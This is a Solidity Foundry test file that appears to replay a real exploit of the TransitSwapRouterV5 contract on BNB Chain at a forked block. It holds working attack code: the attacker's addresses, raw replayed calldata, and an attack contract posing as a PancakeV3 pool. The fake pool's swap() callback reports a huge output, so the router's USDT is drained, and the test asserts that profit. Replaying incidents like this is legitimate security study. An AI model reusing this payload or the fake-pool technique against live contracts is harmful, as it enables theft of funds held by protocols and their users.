
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 34506416;
    uint256 constant TX_TIMESTAMP = 1703037712;
    uint256 constant TX_BLOCK_NUMBER = 34506417;
    uint256 constant TX_VALUE = 10000000000000000;

    address constant BLOCK_CONTEXT_ORACLE = Addresses.A_3599F3_C267;
    bytes4 constant BLOCK_CONTEXT_SELECTOR = 0x2e97766d;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        uint256 replayBlock = _forkBlock();
        if (replayBlock != 0) vm.roll(replayBlock);
    }

    function _forkBlock() internal view returns (uint256) {
        uint256 replayBlock = TX_BLOCK_NUMBER;
        if (BLOCK_CONTEXT_ORACLE.code.length != 0) {
            (bool ok, bytes memory data) =
                BLOCK_CONTEXT_ORACLE.staticcall(abi.encodeWithSelector(BLOCK_CONTEXT_SELECTOR));
            if (ok && data.length >= 32) replayBlock = abi.decode(data, (uint256));
        }
        return replayBlock;
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _snapEcon();
        attack.attack{value: TX_VALUE}();
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        economicOracles.push(
            EconomicOracle(
                Addresses.TransitSwapRouterV5,
                Addresses.ZERO,
                "BNB",
                "position_delta",
                true,
                9999999999999999,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.TransitSwapRouterV5,
                Addresses.USDT,
                "USDT",
                "position_delta",
                false,
                43841867959016089190183,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.TransitSwapRouterV5, Addresses.WBNB, "WBNB", "position_delta", true, 1, false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.PancakeV3Pool,
                Addresses.USDT,
                "USDT",
                "position_delta",
                true,
                36079387053547805071156,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.PancakeV3Pool,
                Addresses.WBNB,
                "WBNB",
                "position_delta",
                false,
                143095188438054991319,
                false
            )
        );
    }
}

contract OurAttack {






    function attack() external payable {
        _attack();
    }

    function _callback() internal {
        _markCallback(0);
    }

    function _swapCb() internal {
        _markCallback(1);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.TransitSwapRouterV5);
    }

    function _attack() internal {
        IContract_3599F3_C267(Addresses.A_3599F3_C267).getBlock();
        {
            bytes memory replayCallData =
                hex"b9b5149b00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000ece3f2645ed0910d4a10f4e262e9fe47c481d9de000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000000000002386f26fc100000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000002386f26fc0ffff0000000000000000000000000000000000000000000000000000000065824b10000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000001e000000000000000000000000000000000000000000000000000000000000000020100000000000000000000007d7583724245eeebb745ebcb1cee0091ff43082b01000000000000000000000036696169c63e42cd08ce11f5deebbcebae65205000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            (bool ok,) = payable(Addresses.TransitSwapRouterV5).call{value: 10000000000000000}(replayCallData);
            require(ok, "replay selector 0xb9b5149b failed");
        }
        ICake_LP(Addresses.Cake_LP).sync();
    }

    function _callback2() internal {
        _markCallback(3);
    }

    function _callback3() internal {
        _markCallback(4);
    }

    receive() external payable {}

    function balanceOf(address account) external view returns (uint256) {
        uint256 live = _tokenBal(account);
        if (live != 0) return live;
        return 0;
    }

    function symbol() external pure returns (string memory) {
        return "POC_HELPER";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function token0() external payable {
        bytes memory ret = hex"000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function swap(address amount, bool amount1, int256 amount2, uint160 amount3, bytes calldata amount4)
        external
        payable
    {
        amount;
        amount1;
        amount2;
        amount3;
        amount4;
        _swapCb();
        bytes memory ret = abi.encode(
            uint256(0), uint256(115792089237316195423570985008687907853269984665640563995615716048897040449753)
        );
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function transfer(address recipient, uint256 amount) external payable {
        recipient;
        amount;
        _attack();
        _recXfer();
        return;
    }

    function token1() external payable {
        bytes memory ret = hex"00000000000000000000000055d398326f99059ff775485246999027b3197955";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function fee() external payable {
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _tokenBalanceLedger;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _tokenBal(address account) internal view returns (uint256) {
        return _tokenBalanceLedger[account];
    }

    function _setTokenBal(address account, uint256 amount) internal {
        _tokenBalanceLedger[account] = amount;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _recXfer() internal {
        address to;
        uint256 amount;
        assembly {
            to := calldataload(4)
            amount := calldataload(36)
        }
        _setTokenBal(to, _tokenBal(to) + amount);
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct ReplayCall {
    address target;
    bytes data;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant TransitSwapRouterV5 = 0x00000047bB99ea4D791bb749D970DE71EE0b1A34;
    address internal constant FEE = 0x1F790E7eB953B3f7eAd89e5a100ffc3B8D2D2b28;
    address internal constant A_3599F3_C267 = 0x3599F3766c9388005Ead030F66010771FcF3c267;
    address internal constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
    address internal constant PancakeV3LmPool = 0x4d67dc640f5327D0e1c7C6537eD8542aaf46cf99;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant attack_contract = 0x7d7583724245EEEBB745eBcB1cee0091FF43082b;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant Cake_LP = 0xEce3F2645Ed0910D4a10F4e262e9FE47C481D9DE;
    address internal constant attacker_eoa = 0xf7552ba0eE5BEd0f306658F4A1201f421d703898;
}

struct Abi_exactInputV3Swap_Param0 {
    address field0;
    address field1;
    address field2;
    address field3;
    uint256 field4;
    uint256 field5;
    uint256 field6;
    uint256 field7;
    uint256[] field8;
    bytes field9;
    string field10;
}

interface ICake_LP {
    function sync() external;
}

interface IContract_3599F3_C267 {
    function getBlock() external view returns (uint256);
}

interface ITransitSwapRouterV5 {
    function exactInputV3Swap(Abi_exactInputV3Swap_Param0 calldata) external payable returns (uint256);
}
